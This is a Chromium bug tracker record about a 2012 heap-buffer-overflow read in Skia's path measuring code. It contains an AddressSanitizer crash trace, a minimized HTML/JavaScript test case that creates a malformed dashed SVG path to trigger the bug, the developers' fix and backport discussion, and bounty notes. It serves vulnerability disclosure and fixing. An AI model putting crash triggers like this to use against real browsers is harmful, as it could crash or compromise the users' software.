# Heap-buffer-overflow in compute_pos_tan

| Field | Value |
|-------|-------|
| **Issue ID** | [40052456](https://issues.chromium.org/issues/40052456) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals |
| **Reporter** | ao...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2012-01-01 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

A heap buffer overflow occurs when the attached page is opened. The page creates a SVG path element and adds an event listener. I originally misread the report and thought this was furher away from the end of the object. Could be low or no security impact if 0 bytes to the right is the only option, but still probably something worth fixing.

**VERSION**  

Chrome Version: 18.0.993.0 (Developer Build 116078)  

Operating System: Linux (Debian 6.0.3, x86\_64)

**REPRODUCTION CASE**  

ASan should report the error on every load with $ chrome tan.html

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

==18562== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f3eae427898 at pc 0x7f3ec06f4549 bp 0x7fffa8cce0a0 sp 0x7fffa8cce098  

READ of size 4 at 0x7f3eae427898 thread T0  

#0 0x7f3ec06f4549 in compute\_pos\_tan(SkPath const&, int, int, int, float, SkPoint\*, SkPoint\*) third\_party/skia/src/core/SkPathMeasure.cpp:0  

#1 0x7f3ec06f485c in SkPathMeasure::getSegment(float, float, SkPath\*, bool) ???:0  

#2 0x7f3ec0802e94 in SkDashPathEffect::filterPath(SkPath\*, SkPath const&, float\*) ???:0  

#3 0x7f3ec06e306a in SkPaint::getFillPath(SkPath const&, SkPath\*) const ???:0  

#4 0x7f3ec06b426f in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const\*, bool) const ???:0  

#5 0x7f3ec06a1fdf in SkCanvas::drawPath(SkPath const&, SkPaint const&) ???:0  

#6 0x7f3ec285a289 in WebCore::GraphicsContext::strokePath(WebCore::Path const&) ???:0  

#7 0x7f3ec42911b0 in WebCore::RenderSVGShape::fillAndStrokePath(WebCore::GraphicsContext\*) ???:0  

#8 0x7f3ec4291a5a in WebCore::RenderSVGShape::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#9 0x7f3ec3612ff7 in WebCore::RenderBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#10 0x7f3ec3f8e2df in WebCore::RenderSVGRoot::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#11 0x7f3ec352b774 in WebCore::InlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0  

#12 0x7f3ec353dc45 in WebCore::InlineFlowBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0  

#13 0x7f3ec3827c0a in WebCore::RootInlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0  

#14 0x7f3ec371cb6e in WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject\*, WebCore::PaintInfo&, WebCore::IntPoint const&) const ???:0  

#15 0x7f3ec358d110 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#16 0x7f3ec358e706 in WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#17 0x7f3ec35898fd in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#18 0x7f3ec358d9e3 in WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#19 0x7f3ec358d120 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#20 0x7f3ec358e706 in WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#21 0x7f3ec35898fd in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#22 0x7f3ec36da85e in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#23 0x7f3ec36d6d97 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#24 0x7f3ec36db059 in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#25 0x7f3ec36d6d97 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#26 0x7f3ec36d56ce in WebCore::RenderLayer::paint(WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, unsigned int) ???:0  

#27 0x7f3ec308cdf5 in WebCore::FrameView::paintContents(WebCore::GraphicsContext\*, WebCore::IntRect const&) ???:0  

#28 0x7f3ec273253c in WebCore::ScrollView::paint(WebCore::GraphicsContext\*, WebCore::IntRect const&) ???:0  

#29 0x7f3ec1d1aed6 in WebKit::WebFrameImpl::paintWithContext(WebCore::GraphicsContext&, WebKit::WebRect const&) ???:0  

#30 0x7f3ec1d1b219 in WebKit::WebFrameImpl::paint(SkCanvas\*, WebKit::WebRect const&) ???:0  

#31 0x7f3ec1d6413e in WebKit::WebViewImpl::paint(SkCanvas\*, WebKit::WebRect const&) ???:0  

#32 0x7f3ec510c1e8 in RenderWidget::PaintRect(gfx::Rect const&, gfx::Point const&, skia::PlatformCanvas\*) ???:0  

#33 0x7f3ec51111e0 in RenderWidget::DoDeferredUpdate() ???:0  

#34 0x7f3ec5104bf5 in RenderWidget::OnUpdateRectAck() ???:0  

#35 0x7f3ec5103539 in RenderWidget::OnMessageReceived(IPC::Message const&) ???:0  

#36 0x7f3ec50b1f98 in RenderViewImpl::OnMessageReceived(IPC::Message const&) ???:0  

#37 0x7f3ec1c28fa8 in MessageRouter::RouteMessage(IPC::Message const&) ???:0  

#38 0x7f3ec1c28e10 in MessageRouter::OnMessageReceived(IPC::Message const&) ???:0  

#39 0x7f3ec1b53f05 in ChildThread::OnMessageReceived(IPC::Message const&) ???:0  

#40 0x7f3ec1ca0949 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ???:0  

#41 0x7f3ec0551934 in MessageLoop::RunTask(base::PendingTask const&) ???:0  

#42 0x7f3ec05521b6 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) ???:0  

#43 0x7f3ec05534a1 in MessageLoop::DoWork() ???:0  

#44 0x7f3ec055e3b7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ???:0  

#45 0x7f3ec055052e in MessageLoop::RunInternal() ???:0  

#46 0x7f3ec054e71f in MessageLoop::Run() ???:0  

#47 0x7f3ec512d745 in RendererMain(content::MainFunctionParams const&) ???:0  

#48 0x7f3ec04abe56 in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main.cc:0  

#49 0x7f3ec04ab314 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) ???:0  

#50 0x7f3ebed133d7 in ChromeMain ??:0  

#51 0x7f3ebed132db in main ???:0  

#52 0x7f3eb85e5c4d in \_\_libc\_start\_main /home/aurel32/eglibc/eglibc-2.11.2/csu/libc-start.c:260  

0x7f3eae427898 is located 0 bytes to the right of 24-byte region [0x7f3eae427880,0x7f3eae427898)  

allocated by thread T0 here:  

#0 0x7f3ec5c54ab4 in malloc ??:0  

#1 0x7f3ec0797e09 in sk\_malloc\_throw(unsigned long) ???:0  

#2 0x7f3ec06e4982 in SkPath::operator=(SkPath const&) ???:0  

#3 0x7f3ec285a1c8 in WebCore::GraphicsContext::strokePath(WebCore::Path const&) ???:0  

#4 0x7f3ec42911b0 in WebCore::RenderSVGShape::fillAndStrokePath(WebCore::GraphicsContext\*) ???:0  

#5 0x7f3ec4291a5a in WebCore::RenderSVGShape::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#6 0x7f3ec3612ff7 in WebCore::RenderBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#7 0x7f3ec3f8e2df in WebCore::RenderSVGRoot::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#8 0x7f3ec352b774 in WebCore::InlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0  

#9 0x7f3ec353dc45 in WebCore::InlineFlowBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0  

#10 0x7f3ec3827c0a in WebCore::RootInlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0  

#11 0x7f3ec371cb6e in WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject\*, WebCore::PaintInfo&, WebCore::IntPoint const&) const ???:0  

#12 0x7f3ec358d110 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#13 0x7f3ec358e706 in WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#14 0x7f3ec35898fd in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#15 0x7f3ec358d9e3 in WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#16 0x7f3ec358d120 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#17 0x7f3ec358e706 in WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#18 0x7f3ec35898fd in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#19 0x7f3ec36da85e in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#20 0x7f3ec36d6d97 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#21 0x7f3ec36db059 in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

#22 0x7f3ec36d6d97 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0  

==18562== ABORTING  

Stats: 3M malloced (6M for red zones) by 20985 calls  

Stats: 0M realloced by 46 calls  

Stats: 2M freed by 12545 calls  

Stats: 0M really freed by 0 calls  

Stats: 44M (11270 full pages) mmaped in 11 calls  

mmaps by size class: 8:32766; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:64; 17:32;  

mallocs by size class: 8:18231; 9:1273; 10:1006; 11:267; 12:64; 13:58; 14:59; 15:10; 16:11; 17:6;  

frees by size class: 8:10535; 9:847; 10:891; 11:146; 12:29; 13:39; 14:43; 15:7; 16:4; 17:4;  

rfrees by size class:  

Stats: malloc large: 6 small slow: 88  

Shadow byte and word:  

0x1fe7d5c84f13: fb  

0x1fe7d5c84f10: 00 00 00 fb fb fb fb fb  

More shadow bytes:  

0x1fe7d5c84ef0: 00 fb fb fb fb fb fb fb  

0x1fe7d5c84ef8: fb fb fb fb fb fb fb fb  

0x1fe7d5c84f00: fa fa fa fa fa fa fa fa  

0x1fe7d5c84f08: fa fa fa fa fa fa fa fa  

=>0x1fe7d5c84f10: 00 00 00 fb fb fb fb fb  

0x1fe7d5c84f18: fb fb fb fb fb fb fb fb  

0x1fe7d5c84f20: fa fa fa fa fa fa fa fa  

0x1fe7d5c84f28: fa fa fa fa fa fa fa fa  

0x1fe7d5c84f30: 05 fb fb fb fb fb fb fb

## Attachments

- [tan.html](attachments/tan.html) (text/html; charset=us-ascii, 433 B)

## Timeline

### in...@chromium.org (2012-01-01)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9702071

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x7f7c987b9898
Crash State:
  - crash stack -
  compute_pos_tan
  SkPathMeasure::getSegment
  SkDashPathEffect::filterPath
  

Minimized Testcase (0.38 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96M2aF1Oh0Y919wVJ2Ydvo04igJOvGikJWBzwThXWNDNoSLDluR2Uz_wB3faGZ_GZefsOAHNH4jtXdx3DK-L-8q9AyMhQCKINTaQTMlyp5NFXMzaUabhDEx2mu6P_KIZlI5qZMmD8rMFqjtj3cKlGRk1ChBeA
<script>

ns = 'http://www.w3.org/2000/svg';

function main() {
    var s = document.createElementNS(ns, 'svg');
    var p = document.createElementNS(ns, 'path');
    document.body.appendChild(s);
    s.appendChild(p);
    p.setAttribute('stroke', 'black');
    p.setAttribute('d', "M 0 1 Z L 0 0 Z L 0 0 Z");
    p.setAttribute('stroke-dasharray', 1);
}

</script>
<body onload="main()">

### in...@chromium.org (2012-01-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-15)

Aki, can you still reproduce this on trunk ? ClusterFuzz shows that this got fixed recently - https://cluster-fuzz.appspot.com/revisions?range=117208:117803

Mike, Skia got rolled forward, r2993:r3035. Do you recall any new changes that could have been responsible for fixing this.

### in...@chromium.org (2012-01-16)

There is no point in keeping the bug open when we know it is fixed. We just need to figure out what fixed it so that we can merge early to m16/m17 branches.

### ao...@gmail.com (2012-01-16)

I seem to have two builds running on different machines
 - reproduces on Chromium 18.0.1005.0 (117208)
 - doesn't reproduce on Chromium 18.0.1008.0 (117806)

### [Deleted User] (2012-01-17)

I made a fix in cubic clipping in rev. 3011 to address this.

### in...@chromium.org (2012-01-17)

Thanks a lot Mike.

Can you please help to cherry pick this into m17 branch (963) - http://code.google.com/p/skia/source/detail?r=3011
We are planning to skip this for m16 stable patch.



### [Deleted User] (2012-01-17)

skia/branches/chrome/963 has been created, starting from skia rev. 2780, with a cherry pick of rev. 3011.

### in...@chromium.org (2012-01-17)

Awesome, thanks Mike.

### in...@chromium.org (2012-01-17)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-06)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-07)

Hello again Aki! Definitely seems like this OOB content might be inferable -- if not via SVG, perhaps via bad paths to the raw <canvas> API. $500

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### ao...@gmail.com (2012-02-08)

@scarybeasts Excellent, thanks for looking into this :) This one also goes to Red Cross.

### sc...@gmail.com (2012-03-06)

Payment for this one was upped to $1337 and went through to American Red Cross.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 117208:117803.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9702071

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x7f7c987b9898
Crash State:
  - crash stack -
  compute_pos_tan
  SkPathMeasure::getSegment
  SkDashPathEffect::filterPath
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=117208:117803

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96M2aF1Oh0Y919wVJ2Ydvo04igJOvGikJWBzwThXWNDNoSLDluR2Uz_wB3faGZ_GZefsOAHNH4jtXdx3DK-L-8q9AyMhQCKINTaQTMlyp5NFXMzaUabhDEx2mu6P_KIZlI5qZMmD8rMFqjtj3cKlGRk1ChBeA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/108901?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052456)*
